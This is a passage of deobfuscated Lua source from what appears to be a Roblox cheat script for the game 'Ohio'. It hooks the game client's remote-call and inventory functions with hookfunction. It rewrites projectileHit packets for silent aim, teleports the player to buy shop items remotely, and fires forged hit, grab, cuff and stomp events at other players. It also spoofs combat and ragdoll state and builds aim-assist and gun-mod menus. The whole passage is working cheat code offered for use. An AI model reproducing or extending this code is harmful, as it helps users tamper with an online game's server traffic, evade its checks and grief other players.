									if flag2 or not flag then
										return
									end
									flag2 = true
									fn100("balloon", tbl25.BalloonTarget)

									if tbl25.Kunai then
										fn100("kunai", "Spirit Kunai")
									end

									if tbl25.CandyCane then
										fn100("candy", "Blue Candy Cane")
									end

									if tbl25.Scythe then
										fn100("scythe", "Spectral Scythe")
									end

									if arg2 then
										pcall(inventory.update, inventory.currentItemsData)
									end

									if arg then
										fn101()
									end

									flag2 = false
								end

								local function fn102(arg, arg2)
									if flag2 or next(tbl24) == nil then
										return
									end
									flag2 = true

									for k, v11 in pairs(tbl24) do
										local items = inventory.items and inventory.items[k]

										if items and v11 and v11.original then
											fn94(items, v11.original, true)
											fn95(k, items)
										end
									end

									if arg2 then
										pcall(inventory.update, inventory.currentItemsData)
									end

									if arg then
										fn101()
									end

									flag2 = false
								end

								fn91 = function(arg)
									flag = arg == true

									if flag then
										fn90(true, true)
									else
										fn102(true, true)
									end
								end
							end

							local fn92, fn93

							do
								local function fn94()
									if flag then
										fn90(true, false)
									end
								end

								pcall(function()
									Connect(inventory.onItemAdded, function()
										if flag then
											fn90(true, false)
										end
									end)
								end)

								local flag4 = false

								fn92 = function(arg, arg2)
									if flag4 or not arg then
										return
									end

									local itemsOnSale = FindFirstChild(workspace, "ItemsOnSale")
										and FindFirstChild(workspace.ItemsOnSale, arg)

									local v11 = fn70()
									if not itemsOnSale or not itemsOnSale.PrimaryPart or not v11 then
										return
									end
									flag4 = true
									local cFrame = v11.CFrame
									local position = itemsOnSale.PrimaryPart.Position

									for i = 1, 3 do
										v11.CFrame = NewCFrame(position)
										InvokeServer("attemptPurchase", arg, false)

										if arg2 then
											InvokeServer("attemptPurchaseAmmo", arg, false)
										end
									end

									Delay(0.15, function()
										local v12 = fn70()

										if v12 then
											v12.CFrame = cFrame
										end

										flag4 = false
									end)
								end

								Connect(
									require(ReplicatedStorage.CmdrClient).RemoteEvent.OnClientEvent,
									function(arg, ...)
										Spawn(fn7, "Blocker", arg, unpack({ ... }))
									end
								)

								local tbl26 = { fireHit = true, smokeHit = true }
								local tbl27 = {}

								Spawn(function()
									while true do
										Wait(0.5)
										local now = tick()

										for k, v11 in pairs(tbl27) do
											if v11.pending and (not v11.last_time or now - v11.last_time >= 3) then
												v11.pending = false
												v11.last_time = now
												Spawn(fn7, "Blocker", k:gsub("Hit", ""), 3)
											end
										end
									end
								end)

								local v11 = nil
								local v12 = hookfunction
								local fireServer = FireServer

								local v13 = luraph_runtime1(function(arg, ...)
									local v13 = table.pack(...)
									local tbl28 = { ... }

									if arg == "projectileHit" then
										local v14 = tbl28[3]
										local hitbox = OhioRageState
										hitbox = hitbox and hitbox.Hitbox

										if
											hitbox
											and hitbox.Module
											and hitbox.Module:Get()
											and tbl28[2] == "player"
											and v14
											and v14.hitPlayerId
										then
											local hitChance = hitbox.HitChance

											if hitChance == nil then
												hitChance = 100
											end

											if hitChance >= 100 or hitChance > 0 and Random() * 100 < hitChance then
												local playerByUserId = Players:GetPlayerByUserId(v14.hitPlayerId)
												playerByUserId = playerByUserId and playerByUserId.Character
												local part = hitbox.Part

												if part == "Random" then
													part = Random(2) == 1 and "Head" or "Body"
												end

												local upperTorso

												if part == "Body" then
													upperTorso = playerByUserId
														and (
															FindFirstChild(playerByUserId, "UpperTorso")
															or FindFirstChild(playerByUserId, "LowerTorso")
														)
												else
													upperTorso = playerByUserId
														and FindFirstChild(playerByUserId, "Head")
												end

												if upperTorso then
													v14.hitPart = upperTorso
													v14.pos = upperTorso.Position
													v14.hitSize = upperTorso.Size
													tbl28[3] = v14
												end
											end
										end

										return v11(arg, unpack(tbl28))
									end

									if tbl26[arg] then
										local now = tick()
										local v14 = tbl27[arg]

										if not v14 then
											tbl27[arg] = { last_trigger = now, last_notify = now, pending = true }
										else
											v14.last_trigger = now

											if now - v14.last_notify >= 3 then
												v14.pending = true
											end
										end

										return
									end

									return v11(arg, table.unpack(v13, 1, v13.n))
								end)

								v11 = v12(fireServer, v13)
								local v14 = nil
								local v15 = hookfunction
								local invokeServer = InvokeServer

								local v16 = luraph_runtime1(function(arg, ...)
									local tbl28 = { ... }

									if arg == "reorderItems" then
										local v16 = tbl28[1]
										local v17 = tbl28[2]

										if tbl10[v16] or tbl10[v17] then
											local currentItemsData = inventory.currentItemsData or {}
											local v18 = nil
											local v19 = nil

											for i = 1, #currentItemsData do
												local v20 = currentItemsData[i]

												if v20 then
													if v20.guid == v16 then
														v18 = i
													elseif v20.guid == v17 then
														v19 = i
													end
												end

												if not (v18 and v19) then
													continue
												end
												break
											end

											if v18 and v19 then
												local currentItemsData2 = inventory.currentItemsData
												local v20 = inventory.currentItemsData[v18]
												inventory.currentItemsData[v18] = inventory.currentItemsData[v19]
												currentItemsData2[v19] = v20
												inventory.update(inventory.currentItemsData)
												return
											end
										end
									end

									return v14(arg, unpack(tbl28))
								end)

								v14 = v15(invokeServer, v16)
								local v17 = nil
								local tbl28 = {}
								fn93 = nil
								local v18 = hookfunction
								local update = inventory.update

								local v19 = luraph_runtime1(function(arg)
									local tbl29

									if typeof(arg) ~= "table" then
										tbl29 = arg
									else
										local tbl30 = {}
										local currentItemsData = inventory.currentItemsData or {}

										for i = 1, #currentItemsData do
											local guid = currentItemsData[i]
											guid = guid and guid.guid

											if guid and tbl10[guid] then
												tbl28[guid] = i
												tbl30[guid] = { index = i, item = tbl10[guid] }
											end
										end

										for k, v19 in pairs(tbl28) do
											if tbl10[k] and not tbl30[k] then
												tbl30[k] = { index = v19, item = tbl10[k] }
											end
										end

										tbl29 = {}

										for i = 1, #arg do
											local v19 = arg[i]
											local guid = v19 and v19.guid

											if not (guid and tbl10[guid]) then
												Insert(tbl29, v19)
											end
										end

										local tbl31 = {}

										for _, v19 in pairs(tbl30) do
											if v19.item and v19.index then
												Insert(tbl31, v19)
											end
										end

										local v19 = fn84(tbl31)

										for i = 1, #v19 do
											local v20 = v19[i]
											local index = v20.index

											if index < 1 then
												index = 1
											elseif #tbl29 + 1 < index then
												index = #tbl29 + 1
											end

											Insert(tbl29, index, v20.item)
										end

										for k in pairs(tbl28) do
											tbl28[k] = nil
										end

										for i = 1, #tbl29 do
											local guid = tbl29[i]
											guid = guid and guid.guid

											if guid and tbl10[guid] then
												tbl28[guid] = i
											end
										end
									end

									local v19 = v17(tbl29)

									if fn93 then
										fn93()
									end

									if fn94 then
										fn94()
									end

									return v19
								end)

								v17 = v18(update, v19)
							end

							local tbl26
							tbl26 = {}

							do
								local v11 = nil
								local v12 = hookfunction
								local replicateEffect = v3effect.ReplicateEffect

								local v13 = luraph_runtime1(function(arg, ...)
									local tbl27 = tbl26 or {}

									for i = 1, #tbl27 do
										local v13 = tbl11[tbl27[i]]

										if v13 ~= nil then
											if typeof(v13) == "table" then
												for i2 = 1, #v13 do
													if arg == v13[i2] then
														return
													end
												end

												continue
											end

											if arg ~= v13 then
												continue
											end
											return
										end
									end

									return v11(arg, ...)
								end)

								v11 = v12(replicateEffect, v13)
							end

							do
								local v11 = nil
								local v12 = hookfunction
								local setEquipped = inventory.setEquipped

								local v13 = luraph_runtime1(function(...)
									local v13 = getthreadidentity()
									setthreadidentity(2)
									v11(...)
									setthreadidentity(v13 or 8)
								end)

								v11 = v12(setEquipped, v13)
							end

							dealerSellCooldown = 0

							do
								local v11 = nil
								local v12 = hookfunction
								local v13 = makeToast

								local v14 = luraph_runtime1(function(...)
									local v14 = table.pack(...)
									local v15 = ({ ... })[1]

									if typeof(v15) == "string" then
										if
											v15:find("Cheap Metal")
											or v15:find("Chemicals")
											or v15:find("craft ready")
										then
											return
										end

										if v15:find("The dealer only has") then
											dealerSellCooldown = tick() + 60
										end
									end

									return v11(table.unpack(v14, 1, v14.n))
								end)

								v11 = v12(v13, v14)
							end

							do
								local function fn94()
									local ok4, result4 = pcall(function()
										return Enum.RaycastFilterType.Include
									end)

									if ok4 and result4 then
										return result4
									end

									local ok5, result5 = pcall(function()
										return Enum.RaycastFilterType.Whitelist
									end)

									if ok5 then
										return result5
									end
								end

								local function fn95(arg)
									if type(arg) == "number" then
										local playerByUserId = Players:GetPlayerByUserId(arg)
										return playerByUserId and playerByUserId.Character
									end

									if typeof(arg) ~= "Instance" then
										return arg
									end

									if IsA(arg, "Player") then
										return arg.Character
									end
									return arg
								end

								local function fn96(arg)
									if type(arg) == "table" then
										if arg.hitType and arg.hit and arg.rootModel then
											return nil, arg
										end

										if arg.cframe and arg.size then
											return arg
										end
									end

									local v11 = fn95(arg)
									if typeof(v11) ~= "Instance" then
										return
									end
									local result4, result5

									if IsA(v11, "Model") then
										local ok4

										ok4, result4, result5 = pcall(function()
											return v11:GetBoundingBox()
										end)

										if not ok4 then
											return
										end
									elseif IsA(v11, "BasePart") then
										result4 = v11.CFrame
										result5 = v11.Size
									else
										local basePart = FindFirstChildWhichIsA(v11, "BasePart", true)
										if not basePart then
											return
										end
										result4 = basePart.CFrame
										result5 = basePart.Size
									end

									local overlapParams = OverlapParams.new()
									local v12 = fn94()

									if v12 then
										overlapParams.FilterType = v12
									end

									overlapParams.FilterDescendantsInstances = { v11 }

									return {
										cframe = result4,
										size = result5 + NewVector3(0.25, 0.25, 0.25),
										overlapParams = overlapParams,
										hitOrigin = result4.Position,
									}
								end

								local function fn97(arg, arg2)
									local v11 = fn95(arg2)
									if not arg or typeof(v11) ~= "Instance" then
										return false
									end
									local hit = arg.hit
									local rootModel = arg.rootModel
									if hit == v11 or rootModel == v11 then
										return true
									end

									if
										typeof(hit) == "Instance"
										and (hit:IsDescendantOf(v11) or v11:IsDescendantOf(hit))
									then
										return true
									end

									if
										typeof(rootModel) == "Instance"
										and (rootModel:IsDescendantOf(v11) or v11:IsDescendantOf(rootModel))
									then
										return true
									end

									return false
								end

								local function fn98(arg)
									local v11, v12 = fn96(arg)
									if v12 then
										return v12
									end

									if not v11 or not zoneUtils or not zoneUtils.zoneHitreg then
										return
									end
									local ok4, result4 = pcall(zoneUtils.zoneHitreg, v11)
									if not ok4 or type(result4) ~= "table" then
										return
									end

									for i = 1, #result4 do
										local v13 = result4[i]
										if fn97(v13, arg) then
											return v13
										end
									end

									return result4[1]
								end

								local function fn99(arg)
									local game_ = FindFirstChild(workspace, "Game")
									local props = game_ and FindFirstChild(game_, "Props")

									while arg and arg ~= workspace do
										if
											GetAttribute(arg, "guid")
											and (
												CollectionService:HasTag(arg, "prop")
												or CollectionService:HasTag(arg, "subprop")
												or props and arg:IsDescendantOf(props)
											)
										then
											return arg
										end

										arg = arg.Parent
									end
								end

								local function fn100(arg)
									local game_ = FindFirstChild(workspace, "Game")
									local vehicles = game_ and FindFirstChild(game_, "Vehicles")
									if not vehicles or not arg:IsDescendantOf(vehicles) then
										return
									end

									while arg and arg.Parent ~= vehicles do
										arg = arg.Parent
									end

									return arg
								end

								local function fn101(arg)
									if not arg then
										return
									end
									local vehicles = state and state.vehicles and state.vehicles[arg]
									if vehicles and vehicles.guid then
										return vehicles.guid
									end
									local guid = FindFirstChild(arg, "GUID")
									if guid then
										return guid.Value
									end
									return GetAttribute(arg, "guid")
								end

								local function fn102(arg, arg2)
									local v11 = fn98(arg2)

									if v11 then
										local hitType = v11.hitType
										local rootModel = v11.rootModel

										if hitType == "player" then
											local playerFromCharacter = Players:GetPlayerFromCharacter(rootModel)
											if playerFromCharacter then
												return "player",
													{ meleeType = arg, hitPlayerId = playerFromCharacter.UserId }
											end
										elseif hitType == "prop" then
											local guid = rootModel and GetAttribute(rootModel, "guid")
											if guid then
												return "prop", { meleeType = arg, guid = guid }
											end
										elseif hitType == "vehicle" then
											local v12 = fn101(rootModel)
											if v12 then
												return "vehicle", { meleeType = arg, guid = v12 }
											end
										else
											if hitType == "furniture" and rootModel then
												return "furniture", { meleeType = arg, guid = rootModel.Name }
											end

											if hitType == "jewelcase" then
												local guid = rootModel and GetAttribute(rootModel, "guid")
												if guid then
													return "jewelcase", { meleeType = arg, guid = guid }
												end
											end
										end
									end

									if type(arg2) == "number" then
										return "player", { meleeType = arg, hitPlayerId = arg2 }
									end

									if typeof(arg2) == "Instance" then
										if IsA(arg2, "Player") then
											return "player", { meleeType = arg, hitPlayerId = arg2.UserId }
										end
										local parent = IsA(arg2, "Model") and arg2 or arg2.Parent
										local playerFromCharacter = parent and Players:GetPlayerFromCharacter(parent)
										if playerFromCharacter then
											return "player",
												{ meleeType = arg, hitPlayerId = playerFromCharacter.UserId }
										end
										local v12 = fn99(arg2)
										local guid = v12 and GetAttribute(v12, "guid")
										if guid then
											return "prop", { meleeType = arg, guid = guid }
										end
										local v13 = fn100(arg2)
										local v14 = fn101(v13)
										if v14 then
											return "vehicle", { meleeType = arg, guid = v14 }
										end
									end
								end
							end

							local function fn94(arg)
								FireServer("equip", arg)
							end

							local fn95

							fn95 = function(H, m, h)
								local B, t = D[1](m, h)
								if not B or not t then
									return false
								end
								D[2]()

								if H then
									D[3](H)
									D[4](H)
								end

								FireServer("attackMeleeHit", B, t)

								if B == "player" and t.hitPlayerId then
									H, m = OhioRageState, Players:GetPlayerByUserId(t.hitPlayerId)

									if m and H then
										if H.GrabAuraModule and (H.GrabAuraModule:Get()) then
											luraph_box(D[5])(m)
										end

										if H.StompAuraModule and (H.StompAuraModule:Get()) then
											luraph_box(D[6])(m)
										end
									end
								end

								return true, B, t
							end

							local fn96

							fn96 = function(arg)
								FireServer("finish", arg)
							end

							local fn97
							local tbl27 = {}

							fn97 = function(arg)
								local now = tick()

								if not tbl27[arg.UserId] then
									tbl27[arg.UserId] = now
								end

								if now - tbl27[arg.UserId] < 0.1 then
									return
								end
								tbl27[arg.UserId] = now
								FireServer("grabPlayer", arg)
							end

							local fn98
							local tbl28 = {}

							fn98 = function(arg)
								local now = tick()

								if not tbl28[arg.UserId] then
									tbl28[arg.UserId] = now
								end

								if now - tbl28[arg.UserId] < 0.1 then
									return
								end
								tbl28[arg.UserId] = now
								FireServer("dropPlayer", arg)
							end

							local fn99

							fn99 = function(arg)
								Spawn(fn92, "Handcuffs")
								local Handcuffs = fn71("Handcuffs")

								if Handcuffs then
									fn75(Handcuffs.guid)
									FireServer("cuffPlayer", arg)
								end
							end

							local n4
							n4 = 64
							local n5
							n5 = 0
							local v11
							v11 = nil
							local v12
							v12 = nil
							local v13
							v13 = nil
							local v14
							v14 = nil
							local v15
							v15 = nil
							local v16
							v16 = nil

							do
								local v17

								local function fn100()
									local position = fn70()
									local camera = Camera()
									position = position and position.Position or camera and camera.CFrame.Position
									n5 = 0
									if not position then
										return n5
									end
									local v18 = GetClosest()

									for i = 1, #v18 do
										local v19 = v18[i]

										if not (n4 <= n5) then
											local character = v19.Character
											local humanoid = character and FindFirstChildOfClass(character, "Humanoid")

											local humanoidRootPart = character
												and FindFirstChild(character, "HumanoidRootPart")

											local head = character and FindFirstChild(character, "Head")

											if
												not (
													not character
													or FindFirstChildOfClass(character, "ForceField")
													or not humanoid
													or humanoid.Health <= 0
													or not humanoidRootPart
													or not head
													or not CheckState(v19)
												)
											then
												n5 += 1
												v17[7][v17[6] + n5] = v19
												v11[7][v11[6] + n5] = character
												v12[7][v12[6] + n5] = humanoid
												v13[7][v13[6] + n5] = humanoidRootPart
												v14[7][v14[6] + n5] = head
												v15[7][v15[6] + n5] = (position - humanoidRootPart.Position).Magnitude
												v16[7][v16[6] + n5] = GetAttribute(v19, "isSpawned") == true
											end

											continue
										end

										break
									end

									return n5
								end

								local function fn101()
									local tbl29 = {}
									local v18 = fn70()
									if not v18 then
										return tbl29
									end

									local function fn102(arg)
										local position = arg and arg.PrimaryPart and arg.PrimaryPart.Position
										if not position then
											return
										end

										Insert(tbl29, {
											model = arg,
											pos = position,
											dist = (position - v18.Position).Magnitude,
											prompt = FindFirstChildOfClass(arg, "ProximityPrompt"),
										})
									end

									local game_ = FindFirstChild(workspace, "Game")
									local entities = game_ and FindFirstChild(game_, "Entities")
									local vehicles = entities and FindFirstChild(entities, "vehicles")

									if vehicles then
										local children = GetChildren(vehicles)

										for i = 1, #children do
											fn102(children[i])
										end
									end

									local vehicles2 = game_ and FindFirstChild(game_, "Vehicles")

									if vehicles2 then
										local children = GetChildren(vehicles2)

										for i = 1, #children do
											fn102(children[i])
										end
									end

									Sort(tbl29, function(arg, arg2)
										return arg.dist < arg2.dist
									end)

									return tbl29
								end

								local tbl29 = {}
								local n6 = 0

								local function fn102()
									local now = tick()
									if now - n6 < 1 then
										return tbl29
									end
									tbl29 = {}
									local game_ = FindFirstChild(workspace, "Game")
									local entities = game_ and FindFirstChild(game_, "Entities")
									local itemPickup = entities and FindFirstChild(entities, "ItemPickup")

									if itemPickup then
										local children = GetChildren(itemPickup)

										for i = 1, #children do
											local v18 = children[i]

											if typeof(v18) == "Instance" then
												Insert(tbl29, v18)
											end
										end
									end

									n6 = now
									return tbl29
								end

								local function fn103(arg, arg2)
									return typeof(arg) == "table" and Find(arg, arg2) ~= nil
								end

								local function fn104(arg)
									if not arg then
										return false
									end
									local proximityPrompt = FindFirstChildOfClass(arg, "ProximityPrompt")
									local clickDetector = FindFirstChildOfClass(arg, "ClickDetector")

									if proximityPrompt then
										fireproximityprompt(proximityPrompt)
									end

									if clickDetector then
										fireclickdetector(clickDetector)
									end

									return proximityPrompt ~= nil or clickDetector ~= nil
								end

								local function fn105(arg, arg2)
									v3effect.ReplicateEffect(arg, { position = arg2, guid = "1" })
								end

								local function fn106(arg)
									if not arg then
										return
									end

									if
										arg.startAmmo
										and arg.startAmmo > 0
										and arg.ammoManager
										and arg.ammoManager.ammoOut < arg.ammo
									then
										fn92(arg.name, true)
									end

									ClientReplicator.Set(LocalPlayer, "reloading", true)
									ClientReplicator.Replicate("reloading")
									FireServer("reload", arg.guid)

									if v3item.crosshairs and v3item.crosshairs.reloading then
										v3item.crosshairs.reloading(arg.reloadTime)
									end
								end

								local function fn107(arg, arg2)
									if not arg or not arg.guid or not arg2 then
										return false
									end

									if arg.ammoManager and not arg.ammoManager:UseAmmo(1) then
										fn106(arg)
										return false
									end
									FireServer("replicateShot")
									FireServer("replicateProjectiles", arg.guid, arg2, arg.firemode)
									return true
								end

								local function fn108(arg, arg2)
									if not arg or not arg2 then
										return {}
									end
									local tbl30 = {}

									local numProjectiles = arg.numProjectiles
										or (arg.subtype == "shotgun" or arg.subtypes == "shotgun") and 8
										or 1

									for i = 1, numProjectiles do
										local cFrame = arg2.CFrame
										Insert(tbl30, { GUID(), cFrame })
									end

									return tbl30
								end

								local function fn109(arg, arg2, arg3)
									if not arg or not arg3 then
										return
									end

									if not arg.equipped then
										fn75(arg.guid)
									end

									local v18 = fn108(arg, arg3)
									if #v18 == 0 or not fn107(arg, v18) then
										return
									end

									if not arg2.UserId then
										return
									end

									for i = 1, #v18 do
										local v19 = v18[i]

										FireServer("projectileHit", v19[1], "player", {
											hitSize = arg3.Size,
											hitPart = arg3,
											pos = arg3.Position,
											hitPlayerId = arg2.UserId,
										})

										if HitmarkerHandler and HitmarkerHandler.PlayerHit then
											HitmarkerHandler.PlayerHit(
												{ type = "bullet", guid = v19[1] },
												nil,
												{ hitPlayerId = arg2.UserId }
											)
										end
									end
								end

								local legit = window:CreateTab({ Id = "ohio-legit", Name = "Legit" })

								local function fn110()
									tonumber(GetAttribute(LocalPlayer, "aimAssistSensitivity"))

									local tbl30 = {
										AimAssist = {
											Module = nil,
											Enabled = true,
											UseFov = true,
											Fov = 45,
											FovColor = NewColor3(1, 1, 1),
											SpeedX = 2.7,
											SpeedY = 2.8,
											PredictionX = 2.8,
											PredictionY = 2.6,
											Range = 300,
											Part = "Body",
											Animation = "Linear",
										},
										SilentAim = {
											Module = nil,
											Enabled = false,
											Fov = 10,
											HitChance = 50,
											Accuracy = 70,
											PointScale = 62,
											Priority = "Closest",
											Hitboxes = { Head = true, Body = true, Arms = true, Legs = true },
											PredictionX = 1.7,
											PredictionY = 1.1,
											VisualizeFov = false,
											IgnoreDowned = true,
										},
										GunMod = {
											Enabled = false,
											Recoil = 100,
											Spread = 100,
											FireDebounce = 100,
											BulletSpeed = 1,
											BulletLifetime = 1,
										},
									}

									local tbl31 = {
										SilentBlock = false,
										AllowBlockStomp = true,
										AntiRagdoll = false,
										NoSit = true,
										NoInCombat = true,
										Connection = nil,
									}

									local v18 = nil
									local v19 = hookfunction
									local check = ClientReplicator.Check

									local v20 = luraph_runtime1(function(arg, arg2)
										if tbl31.AllowBlockStomp and arg == LocalPlayer then
											if debug.traceback():lower():find("stomp") then
												return true
											end
										end

										return v18(arg, arg2)
									end)

									v18 = v19(check, v20)
									local v21 = hookfunction
									local isInCombat = combatIndicator.isInCombat

									local v22 = luraph_runtime1(function()
										if tbl31.NoInCombat then
											return false
										end
										return oldisInCombat()
									end)

									oldisInCombat = v21(isInCombat, v22)

									local function fn111()
										if tbl31.Connection then
											Cancel(tbl31.Connection)
											tbl31.Connection = nil
										end
									end

									local function fn112()
										fn111()

										tbl31.Connection = Spawn(function()
											while (D[1].SilentBlock or D[1].AntiRagdoll or D[1].NoSit) and (Wait()) do
												if D[1].SilentBlock then
													if ClientReplicator.Get(LocalPlayer, "blocking") == false then
														ClientReplicator.Set(LocalPlayer, "blocking", true)
														ClientReplicator.Replicate("blocking")
													end
												end

												if D[1].AntiRagdoll then
													if GetAttribute(LocalPlayer, "isRagdoll") == true then
														ClientRagdoll.SetRagdoll(LocalPlayer, false)
													end
												end

												if D[1].NoSit then
													local D = LocalPlayer.Character
														and (FindFirstChildOfClass(LocalPlayer.Character, "Humanoid"))

													if D and D.Sit then
														D:ChangeState(Enum.HumanoidStateType.Jumping)
													end
												end
											end
										end)
									end

									local state_ = legit:CreateModule({
										Id = "ohio-legit-state",
										Name = "State",
										Default = true,
										Callback = function(arg)
											if arg then
												fn112()
											else
												fn111()
											end
										end,
									})

									state_:CreateToggle({
										Id = "silent-block",
										Name = "Silent Block",
										Default = tbl31.SilentBlock,
										Callback = function(silentBlock)
											tbl31.SilentBlock = silentBlock
										end,
									})

									state_:CreateToggle({
										Id = "allow-block-stomp",
										Name = "Allow Block Stomp",
										Default = tbl31.AllowBlockStomp,
										Callback = function(allowBlockStomp)
											tbl31.AllowBlockStomp = allowBlockStomp
										end,
									})

									state_:CreateToggle({
										Id = "anti-ragdoll",
										Name = "Anti Ragdoll",
										Default = tbl31.AntiRagdoll,
										Callback = function(antiRagdoll)
											tbl31.AntiRagdoll = antiRagdoll
										end,
									})

									state_:CreateToggle({
										Id = "no-sit",
										Name = "No Sit",
										Default = tbl31.NoSit,
										Callback = function(noSit)
											tbl31.NoSit = noSit
										end,
									})

									state_:CreateToggle({
										Id = "no-in-combat",
										Name = "No In Combat",
										Default = tbl31.NoInCombat,
										Callback = function(noInCombat)
											tbl31.NoInCombat = noInCombat
										end,
									})

									if GetAttribute(LocalPlayer, "aimAssistSensitivity") == nil then
										SetAttribute(LocalPlayer, "aimAssistSensitivity", tbl30.AimAssist.SpeedX)
									end

									local function fn113(arg)
										local viewportSize = arg.ViewportSize
										if UserInputService.TouchEnabled then
											return viewportSize.X * 0.5, viewportSize.Y * 0.5
										end
										local mouseLocation = MouseLocation()
										return mouseLocation.X, mouseLocation.Y
									end

									local n7 = Tan(Rad(35))
									local thickness = 1
									local transparency = 0.5
									local v23 = nil
									local v24 = nil
									local v25 = nil
									local connection = nil
									local v26 = nil
									local v27 = nil
									local v28 = nil
									local v29 = nil

									local tbl32 = {
										MaxTargets = 64,
										Count = 0,
										LosParams = NewRayParams(),
										LosFilter = { nil, nil },
										LosReady = false,
										FovLastShow = false,
										FovLastX = 0,
										FovLastY = 0,
										FovLastDiam = 0,
										FovLastColor = nil,
									}

									tbl32.LosParams.FilterType = Enum.RaycastFilterType.Exclude
									tbl32.LosParams.IgnoreWater = true

									pcall(function()
										local hui = typeof(gethui) == "function" and gethui() or CoreGui
										local ScreenGui = NewInstance("ScreenGui")
										ScreenGui.Name = "\0"
										ScreenGui.IgnoreGuiInset = true
										ScreenGui.ResetOnSpawn = false
										ScreenGui.DisplayOrder = 10
										ScreenGui.Parent = hui
										local Frame = NewInstance("Frame")
										Frame.Name = "\0"
										Frame.BackgroundTransparency = 1
										Frame.AnchorPoint = NewVector2(0.5, 0.5)
										Frame.BorderSizePixel = 0
										Frame.Visible = false
										Frame.Parent = ScreenGui
										local UICorner = NewInstance("UICorner")
										UICorner.CornerRadius = NewUDim(1, 0)
										UICorner.Parent = Frame
										local UIStroke = NewInstance("UIStroke")
										UIStroke.Thickness = thickness
										UIStroke.Transparency = transparency
										UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
										UIStroke.Parent = Frame
										v23 = ScreenGui
										v24 = Frame
										v25 = UIStroke
									end)

									local function fn114(arg, arg2)
										local n8 = Clamp((arg2 or 0) * 0.5, 0, 89)
										arg = arg and arg.ViewportSize.Y or 0
										if arg < 1 then
											return 0
										end
										return arg * 0.5 * Tan(Rad(n8)) / n7
									end

									local function fn115()
										if connection then
											Disconnect(connection)
											connection = nil
										end

										if v24 and v24.Visible then
											v24.Visible = false
										end

										tbl32.FovLastShow = false
									end

									local function fn116()
										fn115()
										if not v24 or not v25 then
											return
										end

										local function fn117()
											local v30 = tbl32
											local aimAssist = tbl30.AimAssist
											local camera = Camera()

											local fovLastShow = (
												aimAssist.Module == nil or aimAssist.Module:Get() == true
											)
												and aimAssist.UseFov == true
												and camera ~= nil

											if v30.FovLastShow ~= fovLastShow then
												v30.FovLastShow = fovLastShow
												v24.Visible = fovLastShow
											end

											if not fovLastShow then
												return
											end
											local v31, v32 = fn113(camera)
											local fovLastDiam = Max(2, Floor(fn114(camera, aimAssist.Fov) * 2 + 0.5))
											local fovColor = aimAssist.FovColor or White

											if v30.FovLastColor ~= fovColor then
												v30.FovLastColor = fovColor
												v25.Color = fovColor
												v25.Transparency = transparency
											end

											if v30.FovLastX ~= v31 or v30.FovLastY ~= v32 then
												v30.FovLastX = v31
												v30.FovLastY = v32
												v24.Position = NewUDim2(0, v31, 0, v32)
											end

											if v30.FovLastDiam ~= fovLastDiam then
												v30.FovLastDiam = fovLastDiam
												v24.Size = NewUDim2(0, fovLastDiam, 0, fovLastDiam)
											end
										end

										fn117()
										connection = Connect(RunService.RenderStepped, fn117)
									end

									local function fn117(arg)
										local v30 = v26[7][v26[6] + arg]
										if not v30 then
											return nil
										end
										local part = tbl30.AimAssist.Part
										local v31 = v27[7][v27[6] + arg]
										local v32 = v28[7][v28[6] + arg]
										local v33 = v29[7][v29[6] + arg]

										if part == "Head" then
											if v31 and v31.Parent then
												return v31
											end
										elseif part == "Body" then
											if v32 and v32.Parent then
												return v32
											end

											if v33 and v33.Parent then
												return v33
											end
										end

										if v32 and v32.Parent then
											return v32
										end

										if v31 and v31.Parent then
											return v31
										end
										return v30.PrimaryPart
									end

									local function fn118()
										H[1].Count = 0
										local m, h, B = H[2](), GetPlayerList(), H[1].MaxTargets

										for t = 1, #h, 1 do
											local x = h[t]
											t = x.Character
											local h = t and (FindFirstChildOfClass(t, "Humanoid"))
											local R = t and (FindFirstChild(t, "HumanoidRootPart"))
											local O = t and (FindFirstChild(t, "Head"))

											if
												x ~= LocalPlayer
												and t
												and not FindFirstChildOfClass(t, "ForceField")
												and h
												and h.Health > 0
												and R
												and O
												and (IsA(O, "BasePart"))
												and (CheckState(x))
												and not H[3](x)
											then
												local k, j =
													m and (m.Position - R.Position).Magnitude or 0,
													FindFirstChild(t, "UpperTorso")

												j = if j and not IsA(j, "BasePart") then nil else j
												local m = FindFirstChild(t, "LowerTorso")
												m = if m and not IsA(m, "BasePart") then nil else m
												local i = nil

												if H[1].Count < B then
													H[1].Count = H[1].Count + 1
													i = H[1].Count
												else
													local z, Y = D:Ra(H[4], 1), 1

													for U = 2, B, 1 do
														local B = D:Ra(H[4], U)

														if B > z then
															z, Y = B, U
														end
													end

													i = if k < z then Y else i
												end

												if i then
													D:xa(H[5], i, x)
													D:xa(H[6], i, t)
													D:xa(H[7], i, h)
													D:xa(H[8], i, R)
													D:xa(H[9], i, O)
													D:xa(H[10], i, j)
													D:xa(H[11], i, m)
													D:xa(H[4], i, k)
												end
											end
										end

										return H[1].Count
									end

									local function fn119(arg, arg2, arg3, arg4)
										local v30 = tbl32

										if not v30.LosReady or v30.LosFilter[1] ~= arg4 then
											v30.LosReady = true
											local game_ = FindFirstChild(workspace, "Game")
											v30.LosFilter[1] = arg4
											v30.LosFilter[2] = game_ and FindFirstChild(game_, "Local") or nil
											v30.LosParams.FilterDescendantsInstances = v30.LosFilter
										end

										local n8 = arg2 - arg
										local magnitude = n8.Magnitude
										if magnitude <= 0.25 then
											return true
										end
										local losParams = v30.LosParams
										local hit = RaycastWorkspace(arg, n8.Unit * Min(magnitude, 1500), losParams)
										return not hit or hit.Instance and IsDescendantOf(hit.Instance, arg3)
									end

									local n8 = 0.032
									local n9 = 1000
									local n10 = 0.36
									local n11 = 0.9

									local function fn120(arg, arg2, arg3, arg4, arg5)
										arg2 = arg2 or EmptyVector3
										local n12 = n8 + arg3 / n9 * n10
										return arg + NewVector3(arg2.X * arg4, arg2.Y * arg5, arg2.Z * arg4) * n12 * n11
									end

									local function fn121()
										local animation = tbl30.AimAssist.Animation
										local flag4 = type(animation) == "string" and Enum.EasingStyle[animation]
										if typeof(flag4) == "EnumItem" then
											return flag4
										end
										return Enum.EasingStyle.Linear
									end

									local function fn122(arg, arg2)
										if arg < 0 then
											arg = 0
										elseif arg > 1 then
											arg = 1
										end

										return TweenService:GetValue(arg, arg2, Enum.EasingDirection.InOut)
									end

									local function fn123(arg, arg2, arg3)
										if arg2 == Enum.EasingStyle.Linear then
											return arg
										end
										local num = tonumber(arg3)

										if not num or num <= 0 then
											num = 0.016666666666666666
										end

										return fn122(Clamp(arg * 10 * num, 0, 1), arg2)
									end

									local function fn124(arg, arg2)
										local aimAssistMod = fn73()
